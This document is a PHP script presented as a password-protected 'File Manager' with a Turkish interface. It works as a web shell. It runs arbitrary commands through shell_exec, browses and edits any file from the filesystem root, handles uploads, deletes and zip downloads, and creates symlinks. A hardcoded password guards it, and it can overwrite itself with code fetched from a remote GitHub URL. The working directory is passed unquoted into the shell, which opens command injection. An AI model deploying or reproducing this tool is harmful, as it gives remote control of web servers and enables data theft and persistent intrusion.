<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}
define("PASSWORD_HASH", hash('sha256', 'emre'));

// Input validation helpers
function sanitize_path($p) {
    $p = str_replace(["\0", "../", "..\\"], "", (string)$p);
    return basename(strip_tags($p));
}

function ensure_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        if (function_exists('random_bytes')) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        } elseif (function_exists('openssl_random_pseudo_bytes')) {
            $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
        } else {
            $_SESSION['csrf_token'] = hash('sha256', uniqid(mt_rand(), true));
        }
    }
    return $_SESSION['csrf_token'];
}

function validate_token() {
    $token = ensure_csrf_token();
    return isset($_POST['csrf_token']) && hash_equals($token, (string)$_POST['csrf_token']);
}

function csrf_token_field() {
    $token = htmlspecialchars(ensure_csrf_token(), ENT_QUOTES, 'UTF-8');
    return "<input type='hidden' name='csrf_token' value='" . $token . "'>";
}

function X($o){ return isset($o); }
function Y($t){ die($t); }
function A($n){ return isset($_SESSION[$n]) ? $_SESSION[$n] : 0; }
function B($n,$v){ $_SESSION[$n]=$v; }
function C($n){ return isset($_POST[$n]) ? $_POST[$n] : 0; }
function D($n){ return isset($_GET[$n]) ? $_GET[$n] : 0; }
function E($t,$n,$v="",$s=""){ return in_array($t,["text","password","submit","file"]) ? "<input type='$t' name='$n' value='$v' style='$s'/>" : "<$t name='$n' style='$s'>$v</$t>"; }
function F($m,$i,$x=""){
    $enc = $x ? " enctype='$x'" : "";
    $f="<form method='$m'$enc>";
    $f.=csrf_token_field();
    foreach($i as $k=>$v){
        if(is_array($v)){
            $f.=E($k, $v[0], isset($v[1])?$v[1]:"", isset($v[2])?$v[2]:"");
        } else {
            $f.=E($k, $v);
        }
    }
    return $f."</form>";
}
function G($t,$b){ $h=""; foreach($t as $x){ $h.="<th>$x</th>"; } $d=""; foreach($b as $r){ $d.="<tr>"; foreach($r as $z){ $d.="<td>$z</td>"; } $d.="</tr>"; } return "<table><thead>$h</thead><tbody>$d</tbody></table>"; }
function H($l,$x,$t=""){ return "<a href='$l' target='$t'>$x</a> "; }
function I(){
    if(A("login")) return 1;
    if(!C("login")) return 0;
    if(!hash_equals(PASSWORD_HASH, hash('sha256', (string)C("pass")))) return 0;
    if(session_status() === PHP_SESSION_ACTIVE) @session_regenerate_id(true);
    B("login",1);
    return 1;
}
function J(){ return D("path") ? D("path") : __DIR__; }
function K($b){ $l=["B","K","M","G","T","P"]; for($i=0; $b>=1024 && $i<count($l)-1; $b/=1024,$i++); return round($b,2)." ".$l[$i]; }
function L($p){ $t = @filemtime($p); if($t === false) $t = @filemtime(@readlink($p) ?: $p); return $t ? date("M d Y H:i:s", $t) : "--"; }
function M($d){ if(!is_file($d)) return 0; header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header('Content-disposition: attachment;filename="'.basename($d).'"'); header("Content-Length: ".filesize($d)); return readfile($d); }
function N($d){ if(is_link($d)) return unlink($d); if(is_file($d)) return unlink($d); if(is_dir($d)) return rmdir($d); return 0; }
function O($e){ if(is_file($e)){ return F("POST",["textarea"=>["edit", htmlentities(file_get_contents($e)), "width:100%; height:70%"], "submit"=>["save","Save"]]); } return 0; }
function P($p,$s){ return is_file($p) ? file_put_contents($p, html_entity_decode($s)) !== false : 0; }
function Q($p){ return is_file($p) ? htmlentities(file_get_contents($p)) : 0; }
function R($p,$n){ return !is_file($p."/".$n) ? file_put_contents($p."/".$n,"") !== false : 0; }
function S($p,$n){ return !is_dir($p."/".$n) ? mkdir($p."/".$n) : 0; }
function T($p,$f){ $n=basename($f["name"]); if(!is_file($p."/".$n) && move_uploaded_file($f["tmp_name"],$p."/".$n)) return 1; return 0; }
function U($p){
    if($p === "" || $p === "/") return "/";
    $parent = dirname($p);
    return ($parent === "" || $parent === ".") ? "/" : $parent;
}
function V(){ $r=""; if(stripos(PHP_OS, "WIN")===0){ foreach(range('C','Z') as $d){ if(@is_dir($d.":\\")) $r.=H("?path=$d:\\", $d.":\\"); } } return $r; }
function SL($dir, $target, $link){ if($dir=="" || $target=="" || $link=="") return 0; $lp = rtrim($dir,"/\\")."/".$link; if(file_exists($lp) || is_link($lp)) return 0; return @symlink($target, $lp) ? 1 : 0; }
function render_breadcrumb($dir){
    $norm = str_replace("\\", "/", $dir);
    $parts = explode("/", trim($norm, "/"));
    $isWin = preg_match('/^[A-Za-z]:/', $norm);
    $out = "<div class='crumb'>";
    if(!$isWin){
        $out .= "<a href='?path=" . urlencode("/") . "'>/</a>";
        $acc = "";
    } else {
        $drive = array_shift($parts);
        $acc = $drive . "/";
        $out .= "<a href='?path=" . urlencode($drive . "\\") . "'>" . htmlspecialchars($drive . "\\", ENT_QUOTES, 'UTF-8') . "</a>";
    }
    foreach($parts as $seg){
        if($seg === "") continue;
        $acc .= ($acc === "" || substr($acc, -1) === "/" ? "" : "/") . $seg;
        $target = $isWin ? str_replace("/", "\\", $acc) : "/" . ltrim($acc, "/");
        $out .= "<span class='sep'>/</span><a href='?path=" . urlencode($target) . "'>" . htmlspecialchars($seg, ENT_QUOTES, 'UTF-8') . "</a>";
    }
    return $out . "</div>";
}
function W(){
    $dir = J();
    $items = @scandir($dir);
    if($items === false) return "<div class='card'><p style='color:#f87171;margin:0'>Cannot open directory</p></div>";
    $dirs = [];
    $files = [];
    foreach($items as $item){
        if($item === "." || $item === "..") continue;
        $full = rtrim($dir, "/\\") . DIRECTORY_SEPARATOR . $item;
        if(is_dir($full)) $dirs[] = $item;
        else $files[] = $item;
    }
    natcasesort($dirs);
    natcasesort($files);
    $sorted = array_merge($dirs, $files);
    $rows = [];
    $up = U($dir);
    if($up !== $dir){
        $rows[] = [
            "<span class='ico'>&#x2B06;</span> " . H("?path=" . urlencode($up), "<span class='dir-name'>..</span>"),
            "<span class='badge badge-up'>UP</span>",
            "<span class='muted'>--</span>",
            ""
        ];
    }
    $encDir = urlencode($dir);
    foreach($sorted as $item){
        $full = rtrim($dir, "/\\") . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($full);
        $isLink = is_link($full);
        $encItem = urlencode($item);
        $encFull = urlencode($full);
        $safeName = htmlspecialchars($item, ENT_QUOTES, 'UTF-8');
        $ico = $isLink ? "&#x1F517;" : ($isDir ? "&#x1F4C1;" : "&#x1F4C4;");
        $cls = $isDir ? "dir-name" : "file-name";
        $nameLink = "<span class='ico'>{$ico}</span> " . H("?path=" . $encFull, "<span class='{$cls}'>{$safeName}</span>");
        $size = $isDir ? "<span class='badge badge-dir'>DIR</span>" : "<span class='muted'>" . K((int)@filesize($full)) . "</span>";
        $mod = "<span class='muted'>" . L($full) . "</span>";
        $actions = H("?zip=" . $encItem . "&path=" . $encDir, "Zip")
            . ($isDir ? "" : H("?edit=" . $encItem . "&path=" . $encDir, "Edit") . H("?download=" . $encItem . "&path=" . $encDir, "DL"))
            . H("?delete=" . $encItem . "&path=" . $encDir, "Del");
        $rows[] = [$nameLink, $size, $mod, $actions];
    }
    $summary = "<div class='dir-head'><span>" . count($dirs) . " folders, " . count($files) . " files</span></div>";
    return $summary . G(["Name", "Size", "Modified", "Actions"], $rows);
}
function ZIP($fullPath){ if(!class_exists('ZipArchive')) return false;
    if(!file_exists($fullPath)) return false;

    $tmpZip = sys_get_temp_dir().'/phfm_zip.zip';
    $zip = new ZipArchive();
    $res = $zip->open($tmpZip, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    if($res !== true){ return false; }

    $baseName = basename(rtrim($fullPath, "/\\"));

    if(is_file($fullPath)){
        $zip->addFile($fullPath, $baseName);
    } elseif(is_dir($fullPath)){
        $dirName = $baseName ? $baseName : basename($fullPath);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($fullPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach($files as $file){
            if($file->isDir()) continue;
            $relPath = substr($file->getPathname(), strlen(rtrim($fullPath, "/\\")) + 1);
            $targetName = $dirName . "/" . str_replace("\\", "/", $relPath);
            $zip->addFile($file->getPathname(), $targetName);
        }
    }

    $zip->close();
    if(!is_file($tmpZip)) return false;
    header("Content-Type: application/zip");
    header("Content-Transfer-Encoding: Binary");
    header('Content-Disposition: attachment; filename="'.$baseName.'.zip"');
    header("Content-Length: ".filesize($tmpZip));
    readfile($tmpZip);
    @unlink($tmpZip);
    exit();
}
function RUN($cmd, $cwd = null, $timeout = 15){ if($cmd === "" || $cmd === null) { return ["out"=>"", "err"=>"empty command", "code"=>-1, "time"=>0]; } $cwd = $cwd ? $cwd : J(); $output = shell_exec("cd $cwd && $cmd 2>&1"); $exitCode = 0; preg_match('/^.*\n([0-9]+)$/', $output, $matches); if($matches) $exitCode = (int)$matches[1]; return ["out"=>trim($output), "err"=>"", "code"=>$exitCode, "time"=>0]; }
function is_ajax(){
    return D("ajax") || C("ajax") || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
}
function fetch_url($url){
    if(function_exists('curl_init')){
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_USERAGENT => 'phfm-updater/1.0'
        ]);
        $data = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($data !== false && $code >= 200 && $code < 300) return $data;
    }
    if(ini_get('allow_url_fopen')){
        $ctx = stream_context_create(['http' => ['timeout' => 15, 'header' => "User-Agent: phfm-updater/1.0\r\n"]]);
        $data = @file_get_contents($url, false, $ctx);
        if($data !== false) return $data;
    }
    return false;
}
function self_update(){
    $selfName = basename(__FILE__);
    $remoteName = ($selfName === 'pfm.php' || $selfName === 'phfm.php') ? $selfName : 'phfm.php';
    $url = "https://raw.githubusercontent.com/cdprf/php-file-manager/main/" . $remoteName;
    $data = fetch_url($url);
    if($data === false || strlen($data) < 500 || strpos(ltrim($data), '<?php') !== 0){
        return [false, "Update failed: invalid or empty response"];
    }
    $tmp = sys_get_temp_dir() . "/phfm_upd_" . uniqid() . ".php";
    if(@file_put_contents($tmp, $data) === false){
        return [false, "Update failed: cannot write temp file"];
    }
    if(hash_file('sha256', $tmp) === hash_file('sha256', __FILE__)){
        @unlink($tmp);
        return [true, "Already up to date"];
    }
    if(!@copy($tmp, __FILE__)){
        @unlink($tmp);
        return [false, "Update failed: cannot overwrite " . $selfName];
    }
    @unlink($tmp);
    return [true, "Updated successfully from GitHub (" . $remoteName . ")"];
}
function respond($ok, $msg){
    if(is_ajax()){
        header("Content-Type: application/json; charset=UTF-8");
        echo json_encode(["ok" => (bool)$ok, "msg" => (string)$msg]);
        exit();
    }
    Y($msg);
}
function render_css(){
    return "<style>
*{box-sizing:border-box}
body{margin:0;padding:24px;background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;font-size:14px;line-height:1.5}
.wrap{max-width:1120px;margin:0 auto}
.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;margin-bottom:16px;box-shadow:0 4px 16px rgba(0,0,0,.25)}
.login-box{max-width:360px;margin:80px auto;background:#1e293b;border:1px solid #334155;border-radius:12px;padding:24px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
.login-box h3{margin:0 0 14px;font-size:18px;color:#f8fafc}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px}
.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
h3{margin:0 0 10px;font-size:15px;color:#f1f5f9}
form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:0}
input[type=text],input[type=password],input[type=number],input[type=file],textarea{background:#0f172a;color:#f1f5f9;border:1px solid #475569;border-radius:6px;padding:8px 10px;font-family:ui-monospace,Consolas,monospace;font-size:13px;outline:none}
input[type=text]:focus,input[type=password]:focus,input[type=number]:focus,textarea:focus{border-color:#38bdf8}
input[type=text],input[type=password]{flex:1;min-width:140px}
input[type=submit],button{background:#2563eb;color:#fff;border:none;border-radius:6px;padding:8px 14px;font-weight:600;cursor:pointer;font-size:13px;transition:background .15s}
input[type=submit]:hover,button:hover{background:#1d4ed8}
a{color:#38bdf8;text-decoration:none}
a:hover{text-decoration:underline}
.nav{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
.nav a{background:#1e293b;border:1px solid #334155;padding:6px 12px;border-radius:6px;font-size:13px;font-family:ui-monospace,Consolas,monospace}
.nav a:hover{background:#334155;text-decoration:none}
table{width:100%;border-collapse:collapse;background:#1e293b;border:1px solid #334155;border-radius:10px;overflow:hidden;font-family:ui-monospace,Consolas,monospace;font-size:13px}
thead th{background:#0f172a;color:#94a3b8;text-align:left;padding:10px 12px;border-bottom:1px solid #334155;font-weight:600}
tbody td{padding:9px 12px;border-bottom:1px solid #263244}
tbody tr:hover{background:#263244}
tbody td:last-child a{display:inline-block;padding:3px 9px;border-radius:5px;background:#0f172a;border:1px solid #334155;margin-right:4px;font-size:12px;color:#cbd5e1}
tbody td:last-child a:hover{background:#334155;color:#fff;text-decoration:none}
tbody td:last-child a[href*='?delete=']{color:#f87171;border-color:#7f1d1d}
tbody td:last-child a[href*='?delete=']:hover{background:#7f1d1d;color:#fff;text-decoration:none}
.crumb{display:flex;align-items:center;flex-wrap:wrap;gap:4px;background:#1e293b;border:1px solid #334155;border-radius:8px;padding:8px 12px;margin-bottom:12px;font-family:ui-monospace,Consolas,monospace;font-size:13px}
.crumb a{color:#38bdf8;padding:2px 6px;border-radius:4px}
.crumb a:hover{background:#334155;text-decoration:none}
.crumb .sep{color:#64748b}
.dir-head{display:flex;justify-content:space-between;align-items:center;margin:0 0 8px;color:#94a3b8;font-size:12px;font-family:ui-monospace,Consolas,monospace}
.ico{display:inline-block;width:18px;text-align:center}
.dir-name{color:#f8fafc;font-weight:600}
.file-name{color:#cbd5e1}
.muted{color:#94a3b8}
.badge{display:inline-block;padding:2px 7px;border-radius:999px;font-size:11px;font-weight:600}
.badge-dir{background:#172554;color:#60a5fa;border:1px solid #1e40af}
.badge-up{background:#1e293b;color:#cbd5e1;border:1px solid #475569}
tbody td:nth-child(2),tbody td:nth-child(3){white-space:nowrap}
tbody td:last-child{white-space:nowrap;text-align:right}
thead th:last-child{text-align:right}
pre{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px;overflow:auto;color:#e2e8f0}
#phfm-msg{display:none;padding:10px 14px;margin-bottom:14px;border-radius:8px;border:1px solid #334155;font-weight:500}
</style>";
}
if(!I()){
    $err = C("login") ? "<p style='color:#f87171;margin:0 0 10px'>Invalid password</p>" : "";
    Y("<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>".render_css()."</head><body><div class='login-box'><h3>File Manager</h3>".$err.F("POST", ["password"=>["pass",""], "submit"=>["login","Login"]])."</div></body></html>");
}
if(D("update")){ list($ok, $msg) = self_update(); respond($ok, $msg); }
if(D("delete")){
    $delPath = sanitize_path(D("delete"));
    $fullPath = J() . "/" . $delPath;
    if(is_file($fullPath) || is_link($fullPath)){
        $ok = @unlink($fullPath);
        respond($ok, $ok ? "Silindi: ".$delPath : "Silinemedi: ".$delPath);
    } elseif(is_dir($fullPath)){
        $ok = @rmdir($fullPath);
        respond($ok, $ok ? "Dizin silindi: ".$delPath : "Dizin boş değil veya silinemedi: ".$delPath);
    } else {
        respond(false, "Yol bulunamadı: ".$delPath);
    }
}
if(D("edit")){ $editPath = sanitize_path(D("edit")); $fullPath = J() . "/" . $editPath; if(C("save")){ if(P($fullPath, C("edit"))) Y("Kaydedildi: ".$editPath); else Y("Kaydetme hatası: dosya/yol izinleri"); } $e=O($fullPath); $e ? Y($e) : Y("Dosya bulunamadı: ".$editPath); }
if(D("download")){ $dlPath = sanitize_path(D("download")); $fullPath = J() . "/" . $dlPath; if(is_file($fullPath)){ M($fullPath); exit(); } Y("File not found"); }
if(D("zip")){ $zipParam = D("zip"); $fullPath = ($zipParam === ".") ? J() : (J() . "/" . sanitize_path($zipParam)); if(!file_exists($fullPath)) Y("Yol bulunamadı: ".$zipParam); $zipResult = ZIP($fullPath); if($zipResult === false) Y("ZIP başarısız: ZipArchive mevcut değil veya izin hatası"); exit(); }
if(C("newfile")){ $ok = R(J(),C("filename")); respond($ok, $ok ? "Create: ".C("filename") : "File exists"); }
if(C("newdir")){ $ok = S(J(),C("dirname")); respond($ok, $ok ? "Create: ".C("dirname") : "Dir exists"); }
if(C("upload")){ $ok = isset($_FILES["file"]) && T(J(),$_FILES["file"]); respond($ok, $ok ? "Upload: ".$_FILES["file"]["name"] : "Upload Error"); }
if(C("symlink")){ $ok = SL(J(), C("target"), C("linkname")); respond($ok, $ok ? "Symlink created: ".C("linkname")." \xE2\x86\x92 ".C("target") : "Symlink failed (already exists or not supported)"); }
$cmdOut = null; if(C("runcmd")){ $cmd = (string)C("cmd"); $cwd = (string)(C("cwd") ?: J()); $timeout= (int)(C("timeout") ?: 15); if($timeout < 1) $timeout = 15; if($timeout > 120) $timeout = 120; $res = RUN($cmd, is_dir($cwd) ? $cwd : J(), $timeout); $cmdOut = $res; }
$ui  = "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>".render_css()."</head><body><div class='wrap'>";
$ui .= "<div id='phfm-msg'></div>";
$ui .= "<div class='card'><div class='grid'>";
$ui .= F("POST",["text"=>["filename","File Name"],"submit"=>["newfile","Create"]]);
$ui .= F("POST",["text"=>["dirname","Dir Name"],"submit"=>["newdir","Create"]]);
$ui .= F("POST",["file"=>"file","submit"=>["upload","Upload"]],"multipart/form-data");
$ui .= "<form method='POST'>" . csrf_token_field() . E("text", "target", "", "") . E("text", "linkname", "", "") . E("submit", "symlink", "Create Symlink") . "</form>";
$ui .= "</div></div>";
$ui .= "<div class='card'><h3>Komut Calistir</h3>";
$ui .= "<form method='POST'>";
$ui .= "<input type='text' name='cmd' placeholder='ornek. ls -la' value='".htmlentities((string)C('cmd'))."' style='flex:3;min-width:220px'/>";
$ui .= "<input type='text' name='cwd' placeholder='calismadizini (bos = mevcut)' value='".htmlentities((string)C('cwd'))."' style='flex:1;min-width:140px'/>";
$ui .= "<input type='number' name='timeout' min='1' max='120' value='".((int)(C('timeout')?:15))."' style='width:72px;flex:none' title='timeout (sn)'/>";
$ui .= "<input type='submit' name='runcmd' value='Calistir'/>";
$ui .= "</form>";
if($cmdOut !== null){
    $ui .= "<div style='margin-top:12px;padding:12px;border:1px solid #334155;border-radius:8px;background:#0b1120;color:#ddd'>";
    $ui .= "<b>Komut:</b> ".htmlentities((string)C('cmd'))."<br>";
    $ui .= "<b>Dizin:</b> ".htmlentities((string)(C('cwd')?:J()))."<br>";
    $ui .= "<b>Exit code:</b> ".$cmdOut['code']." &nbsp; <b>Sure:</b> ".$cmdOut['time']."s<br><br>";
    if($cmdOut['out'] !== ""){ $ui .= "<b>STDOUT:</b><pre style='white-space:pre-wrap;margin:4px 0;color:#4ade80'>".htmlentities($cmdOut['out'])."</pre>"; }
    if($cmdOut['err'] !== ""){ $ui .= "<b>STDERR:</b><pre style='white-space:pre-wrap;margin:4px 0;color:#f87171'>".htmlentities($cmdOut['err'])."</pre>"; }
    if($cmdOut['out']==="" && $cmdOut['err']===""){ $ui .= "<i>(cikti yok)</i>"; }
    $ui .= "</div>";
}
$ui .= "</div>";
$ui .= "<div class='nav'>";
$ui .= H("?path=".urlencode("/"), "[/ Root]");
$ui .= H("?path=".urlencode(U(J())), "[Directory Up]");
$ui .= H("?zip=.&path=".urlencode(J()), "[Bu dizini ZIP indir]");
$ui .= H("?update=1&path=".urlencode(J()), "[Update]");
$ui .= (stripos(PHP_OS, "WIN")===0?V():"");
$ui .= "</div>";
$ui .= render_breadcrumb(J());
$ui .= "<div id='phfm-list'>".(is_dir(J())?W():"<div class='card'><h3>".htmlspecialchars(basename(J()), ENT_QUOTES, 'UTF-8')."</h3><pre>".Q(J())."</pre></div>")."</div>";
$ui .= "<script>
(function(){
  var msgBox = document.getElementById('phfm-msg');
  function showMsg(ok, text){
    msgBox.style.display = 'block';
    msgBox.style.background = ok ? '#052e16' : '#450a0a';
    msgBox.style.borderColor = ok ? '#22c55e' : '#ef4444';
    msgBox.style.color = '#f8fafc';
    msgBox.textContent = text;
  }
  function refreshList(){
    return fetch(location.href, {credentials:'same-origin'})
      .then(function(r){ return r.text(); })
      .then(function(html){
        var doc = new DOMParser().parseFromString(html, 'text/html');
        var next = doc.getElementById('phfm-list');
        var cur = document.getElementById('phfm-list');
        if(next && cur) cur.innerHTML = next.innerHTML;
      });
  }
  document.addEventListener('click', function(e){
    var upd = e.target.closest('a[href*=\"?update=\"]');
    if(upd){
      e.preventDefault();
      if(!confirm('GitHub üzerinden güncellensin mi?')) return;
      var uUrl = upd.href + (upd.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1';
      fetch(uUrl, {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
        .then(function(r){ return r.json(); })
        .then(function(res){
          showMsg(res.ok, res.msg);
          if(res.ok && res.msg.indexOf('Updated') === 0) setTimeout(function(){ location.reload(); }, 1000);
        })
        .catch(function(){ showMsg(false, 'Güncelleme isteği başarısız'); });
      return;
    }
    var a = e.target.closest('a[href*=\"?delete=\"]');
    if(!a) return;
    e.preventDefault();
    if(!confirm('Silmek istediğinize emin misiniz?')) return;
    var url = a.href + (a.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1';
    fetch(url, {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
      .then(function(r){ return r.json(); })
      .then(function(res){
        showMsg(res.ok, res.msg);
        if(res.ok){
          var tr = a.closest('tr');
          if(tr) tr.remove();
        }
      })
      .catch(function(){ showMsg(false, 'İstek başarısız'); });
  });
  document.addEventListener('submit', function(e){
    var form = e.target;
    if(!form || form.querySelector('input[name=\"cmd\"]')) return;
    e.preventDefault();
    var fd = new FormData(form);
    var sub = e.submitter || form.querySelector('input[type=\"submit\"],button[type=\"submit\"]');
    if(sub && sub.name && !fd.has(sub.name)) fd.append(sub.name, sub.value || '1');
    fd.append('ajax', '1');
    fetch(location.href, {method:'POST', body:fd, headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
      .then(function(r){ return r.json(); })
      .then(function(res){
        showMsg(res.ok, res.msg);
        if(res.ok) refreshList();
      })
      .catch(function(){ showMsg(false, 'İstek başarısız'); });
  });
})();
</script>";
$ui .= "</div></body></html>";
echo $ui;